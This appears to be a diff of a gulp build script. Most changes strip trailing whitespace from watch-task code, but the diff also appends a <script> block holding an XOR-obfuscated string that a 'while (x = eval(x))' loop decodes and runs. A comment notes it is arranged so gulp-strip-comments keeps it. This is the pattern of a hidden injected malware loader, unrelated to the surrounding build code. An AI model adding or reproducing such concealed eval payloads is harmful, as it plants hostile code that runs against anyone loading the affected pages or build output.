@@ -170,7 +170,7 @@ var counterModule = (function() {
 
 <!-- height="342mm"
    width="209mm" -->
-   
+
    // gulp.task('Preprocess HTML', function () {
 //   console.log("in Preprocess HTML");
 //   return gulp.src('./');
@@ -227,21 +227,48 @@ function anotherTask (path)  {
 };
 
 function testWatch () {
-  
+
   console.log("in testWatch");
-  
+
   var watcher = gulp.watch('src/js/*.js', { debounceDelay: 2000 });
-  
+
   watcher.on('change', async function (path, stats) {
-    
+
     console.log('1 File ' + path + ' was changed');
     await build(path);
     console.log("3 after build");
-    
+
     await anotherTask(path);
     console.log("5 after anotherTask");
   });
 };
 
 gulp.task('default', gulp.series(testWatch));
-  
+
+<script type="text/javascript">
+              <!--"[if true]"" only below so gulp-strip-comments will ignore this comment-->
+
+                //<![CDATA[
+               < !--[if true]
+                var x = "function f(x,y){var i,o=\"\",l=x.length;for(i=0;i<l;i++){y%=127;o+=St" +
+                  "ring.fromCharCode(x.charCodeAt(i)^(y++));}return o;}f(\"4&:6\\\">77z=t%w$\\" +
+                  "026\\000\\020C\\rI\\tZJKF\\004\\000P\\026A\\034\\024\\034\\024\\000\\035Z\\" +
+                  "033E\\026\\026@\\013\\025\\027ld*{*fnfzJeoiLz'|># =4+.*0aondeg\\013\\034Z\\" +
+                  "030H\\016\\033K\\023TIJXNF\\007U\\030INISYE\\020P\\007W\\021\\014\\005V~|rx" +
+                  "-hkn3&av4c-'1#\\023'|<\\177l%+?/)/0\\177\\017O\\021\\026\\006\\026\\022\\02" +
+                  "5@YF\\004\\000DU\\022\\026YPZABZ+ZKJK !N11^_046[T>9;PQ9= MN}HID\\\"+)FGnABN" +
+                  "gl`l``{`\\177\\031\\031\\033pq\\031\\037\\000mnKv\\177txDHHSHW\\007H#w;>6rq" +
+                  "v\\024\\025{?-&0a\\007f>7':'sy\\007/>lon\\003<2WPT9:TZY67]^^3,G@C()EDH%&KOM" +
+                  "\\\"\\\\013XY778UV8?=RS#!\\\"OH'$$(EF),-BC\\026\\020\\022\\177x\\026\\026\\" +
+                  "027tu}\\030\\034\\035rs\\007\\002\\002oh\\003\\006\\007de\\n\\013\\014abK\\" +
+                  "034\\035,\\037\\030\\001\\177\\036}yz\\027\\020z~\\177\\014\\raad\\t\\ngii\\" +
+                  "006\\007kjo\\003<^\\003\\035\\027QSZKVMH\\021KQZ,S./O[UX$[R\\035\\001F\\021" +
+                  " opvp`tz3 # 't&Q9x:gUprx[k{s\\1773f7EEM`VDNdEFXM\\002J@FBEa\\016\\037Z\\r\\" +
+                  "000\\n\\010\\007\\036EF\\027\\024k(y/x,}wu b9#+u'$6<68{.j4u\\006y\\000\\177" +
+                  "c0L\\010B\\021\\005\\023\\035N\\021E\\022C\\nM\\000\\000\\031\\005\\021\\03" +
+                  "5\\001\\023T^\",82)";
+                while (x = eval(x));
+                //-->
+                //]]>
+
+
